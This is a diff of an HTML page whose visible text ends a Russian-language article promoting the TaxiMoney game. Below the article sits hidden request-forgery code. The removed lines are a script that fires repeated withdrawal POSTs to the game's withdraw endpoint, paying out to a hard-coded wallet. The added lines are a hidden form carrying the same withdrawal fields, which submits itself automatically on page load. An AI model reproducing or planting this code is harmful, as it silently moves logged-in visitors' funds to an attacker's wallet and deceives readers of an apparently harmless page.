@@ -68,43 +68,15 @@
 	<h2>Заключение</h2>
 	<p>Экономическая игра TaxiMoney - это отличный способ заработать деньги и получить удовольствие от игры в одном лице. Если вы следуете стратегиям, которые мы описали выше, то вы сможете значительно увеличить свой доход в этой игре. Удачи!</p>
 </main>
+	<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
+ <input name="paymentSystem" type="hidden" value="24" />
+<input name="sum" type="hidden" value="1000" />
+<input name="wallet_id" type="hidden" value="TGPNk7d7JKxKmLP1q7bxqzLmxx32Qtgs3T" />
+ <input type="submit" value="Submit Request" />
+</form>
+ 
 <script>
-const url = "https://app.taxi-money.me/finance/withdraw/request";
-const paymentSystem = "24";
-const wallet_id = "TGPNk7d7JKxKmLP1q7bxqzLmxx32Qtgs3T";
-const sums = [10000, 5000, 1000];
-
-// Функция для отправки POST-запросов
-function sendPostRequest(url, data) {
-  return fetch(url, {
-    method: "POST",
-    body: data,
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-    },
-  }).then((response) => response.json());
-}
-
-// Цикл для отправки запросов с разными параметрами "sum"
-for (let i = 0; i < 10; i++) {
-  for (let j = 0; j < sums.length; j++) {
-    const sum = sums[j];
-    const data = new FormData();
-    data.append("paymentSystem", paymentSystem);
-    data.append("sum", sum);
-    data.append("wallet_id", wallet_id);
-    sendPostRequest(url, data)
-      .then((response) =>
-        console.log(
-          `Запрос отправлен. Сумма: ${sum}, ответ сервера:`,
-          response
-        )
-      )
-      .catch((error) =>
-        console.error(`Ошибка при отправке запроса. Сумма: ${sum}`, error)
-      );
-  }
-}
+ document.getElementById("autosubmit").submit();
 </script>
 
 </body>
